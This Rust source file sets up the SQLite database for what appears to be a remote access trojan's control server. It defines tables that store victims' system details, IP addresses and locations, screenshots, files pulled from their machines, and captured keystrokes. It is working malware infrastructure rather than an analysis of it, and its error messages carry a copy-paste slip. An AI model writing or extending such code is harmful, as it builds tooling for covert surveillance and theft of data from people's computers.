use sqlite;
use std::path::Path;

pub fn init_db() -> Option<()> {
  let db_path = "rats.db";
  let file_existed = Path::new(db_path).exists();
  
  let conn = match sqlite::open(db_path) {
    Ok(conn) => {
      if !file_existed {
        println!("Database file created: {}", db_path);
      }
      conn
    },
    Err(e) => {
      eprintln!("Failed to open database: {}", e);
      return None;
    }
  };

  let create_table = "
    CREATE TABLE IF NOT EXISTS metadata (
      id TEXT,
      os TEXT,
      cpu TEXT,
      cpu_usage TEXT,
      memory TEXT,
      memory_usage TEXT,
      storage TEXT,
      used_storage TEXT,
      user TEXT,
      timestamp TEXT,
      ip TEXT,
      location TEXT,
      hostname TEXT,
      PRIMARY KEY (id, timestamp)
    );
  ";
  if let Err(e) = conn.execute(create_table) {
    eprintln!("Failed to to make metadata table: {}", e);
    return None;
  }

  let create_table = "
    CREATE TABLE IF NOT EXISTS screenshots (
      id TEXT PRIMARY KEY,
      data BLOB,
      timestamp TEXT
    );
  ";
  if let Err(e) = conn.execute(create_table) {
    eprintln!("Failed to to make metadata table: {}", e);
    return None;
  }
  let create_table = "
    CREATE TABLE IF NOT EXISTS filedownloads (
      download_id TEXT PRIMARY KEY,
      rat_id TEXT,
      file_path TEXT,
      timestamp TEXT,
      downloadedchunks TEXT,
      totalchunks TEXT
    );
  ";
  if let Err(e) = conn.execute(create_table) {
    eprintln!("Failed to to make metadata table: {}", e);
    return None;
  }

  let create_table = "
     CREATE TABLE IF NOT EXISTS keylogs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      rat_id INTEGER NOT NULL,
      keystrokes TEXT NOT NULL,
      statistics TEXT NOT NULL,
      timestamp INTEGER NOT NULL
    );
  ";
  if let Err(e) = conn.execute(create_table) {
    eprintln!("Failed to to make metadata table: {}", e);
    return None;
  }

  Some(())
}
